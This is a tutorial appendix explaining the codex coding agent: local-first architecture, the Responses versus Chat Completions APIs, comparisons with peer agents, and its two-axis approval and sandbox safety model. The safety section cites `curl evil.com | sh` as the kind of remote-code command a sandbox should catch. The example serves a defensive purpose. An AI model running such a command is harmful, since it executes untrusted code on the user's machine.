---
title: "Appendix A · Mental model: local-first + Responses-vs-Chat-Completions + peers"
chapter: A
slug: appendix-a-mental-model
est_read_min: 10
---

# Appendix A · Mental model

> The previous chapter walked codex's code skeleton. This one walks "why codex looks the way it does" — a few **non-code** trade-offs.

---

## A1. The local-first agent architecture

Codex is **fully local**:

- The binary lives on the user's machine.
- Session state is in `~/.codex/`.
- Model API calls go straight from the user's machine; OpenAI sees one request and one response, no intermediate state.
- All tool execution runs in the user's process and on the user's filesystem.

Compare with "cloud agents" (claude.ai's Computer Use, ChatGPT's web Codex, Cursor's server-side agent): the cloud has to spin up a sandbox VM, push the code, run the agent remotely, then pull the diff back. The architectural divide is "where do code and commands actually run".

| Dimension | Local-first (codex / claude-code / cline / aider) | Cloud (Cursor agent / ChatGPT Codex web) |
|---|---|---|
| Latency | each tool call is a local syscall, ~ms | each tool call round-trips to a sandbox VM, ~100ms |
| Privacy | code never leaves the machine; the model sees only the prompt | code is pushed to a third-party sandbox, possibly logged |
| Network | only needs network during LLM calls | needs a stable always-on connection |
| Files | reads/writes the real project files | requires push/pull diffs |
| Debug | you can attach gdb if a tool crashes; rollouts are grep-able | black box |
| Install | user installs codex + configures API key | works in a browser |

Codex chose local-first for **trust**: developers will let the LLM look at the code but won't upload it to an unfamiliar cloud sandbox. Same reason claude-code is local.

The cost: every codex upgrade is a user reinstall; multi-machine state sync needs extra plumbing (codex doesn't do it — rollout files don't roam).

## A2. Responses API vs Chat Completions API

OpenAI offers two chat-shaped APIs:

- **Chat Completions** (`/v1/chat/completions`) — the classic. A `messages` array with user/assistant/tool roles; assistant messages can carry a `tool_calls` array; the frontend feeds tool results back via the next user message keyed by `tool_calls.id`.
- **Responses API** (`/v1/responses`) — introduced late 2024. Instead of pushing a messages array each turn, the server maintains a thread; the response is a typed `ResponseItem` stream with variants like `Text` / `ToolUse` / `Reasoning` / `FileSearch` / `WebSearch`.

Codex defaults to Responses. learn-codex uses Chat Completions. The shapes differ but the **expressive power is roughly the same** — only a few Responses-only things matter:

- **`Reasoning` stream**: the model emits chain-of-thought (tokens or summary). CC doesn't surface it. Outside `o1` / `o3`-style reasoning models this is empty anyway.
- **Server-side thread**: CC is stateless (messages re-sent each turn); Responses lets the server remember. `thread_id` is reusable across calls — but codex doesn't actually depend on the server-side state (rollout is local), only on the streaming shape.
- **Structured tool-use inline**: `ResponseItem::ToolUse` is a typed object; CC ships args as a JSON-encoded string.

Why does learn-codex use CC?

1. CC is the lingua franca. Anthropic Messages, Gemini, Mistral, Together, Ollama all align with CC's shape. Master CC and you can read every non-OpenAI provider.
2. CC's SSE format is simpler than Responses (`{choices:[{delta:{content:"x"}}]}` vs `event: response.text.delta\ndata: {...}`).
3. The CC tool-call accumulator (assemble args by index) is a teaching-worthy puzzle; Responses ships complete ToolUse objects and hides this puzzle.

So: **read learn-codex before codex-rs; read OpenAI's Chat Completions tools cookbook before learn-codex** — layered learning.

## A3. Peer comparison

```
                                  local vs cloud         IDE-resident      Tool-as-protocol
                                  ──────────────         ────────────      ─────────────────
codex                             local                  no (CLI/TUI)      yes (MCP)
claude-code (Anthropic)           local                  optional (--ide)  yes (claude SDK / hooks)
cursor agent (Anysphere)          cloud                  yes (Cursor)      no (proprietary)
cline (claude-dev fork)           local                  yes (VS Code)     yes (MCP)
aider                             local                  no (CLI)          no (Python libs)
ChatGPT Codex web                 cloud                  no (web)          no
```

**Most similar to claude-code**: local, CLI/TUI, MCP support, approval policy + sandbox, durable rollouts (.ass files vs JSONL). Differences: claude-code is Anthropic's, bound to Anthropic Messages API; codex is OpenAI's, bound to Responses API. Codex's V4A patch DSL is stricter than claude-code's unified-diff-with-fuzzy-match.

**Most similar to cline**: both open source, community-driven, strong MCP support. Difference: cline runs in a VS Code process, UI is a webview; codex is a stand-alone binary, UI is Ratatui.

**Most similar to aider** on the "git-aware CLI agent" axis: both focus on patches + git. Difference: aider defaults to unified diff, doesn't sandbox, is aggressive in auto mode; codex is strict on sandbox + approval.

**Least like cursor agent**: cursor runs the agent in a cloud VM; codex runs in your laptop's shell. Different security models — cursor assumes enterprise users accept the cloud sandbox; codex assumes hackers don't.

## A4. The two-axis safety model: approval × sandbox

Codex splits "safety" into two independent dimensions — many newcomers conflate them.

**approval_policy** decides **when to ask the user**:

| Policy | Meaning |
|---|---|
| Never | Don't ask. CI / automation. |
| OnFailure | Run first; ask whether to retry on non-zero exit. |
| OnRequest | Ask every time. Most conservative. |
| UnlessTrusted | Skip the prompt for execpolicy-tagged "allow". **Default.** |
| Granular | Like UnlessTrusted but shows the rule's reason. |

**sandbox_mode** decides **what's allowed when it actually runs**:

| Mode | Files | Network |
|---|---|---|
| DangerFullAccess | full R/W | full |
| ReadOnly | full R, 0 W | localhost only |
| WorkspaceWrite | full R, cwd writable | localhost only |
| ExternalSandbox | (user-provided wrapper) | (same) |

**The two axes are orthogonal**:

- CI lint job: `approval=Never + sandbox=ReadOnly`. Never blocks, only reads code.
- Local interactive debugging: `approval=UnlessTrusted + sandbox=WorkspaceWrite`. Common commands fly through; sensitive ones prompt; writes confined to the project dir.
- Remote sandbox where the agent can play: `approval=OnFailure + sandbox=DangerFullAccess`. Let it explode; not your machine.

A common newbie mistake: **configure approval but not sandbox** — the LLM "casually" runs `curl evil.com | sh`, the user clicks yes, no sandbox to catch it. Or vice versa: **only sandbox, approval=Never** — the LLM rampages within the sandbox, deleting cwd files because the user never refused. Both layers must be configured.

The teaching version (s05 + s06 + s08) shows both layers, but s10 doesn't yet wire them into the main loop — that's a reader exercise.

---

In summary: codex is **a local-first, OpenAI-API-bound, two-axis-safety-modelled** coding agent. After reading this you should be able to draw codex's position on the agent map; the next appendix shows how to keep reading codex-rs upstream.
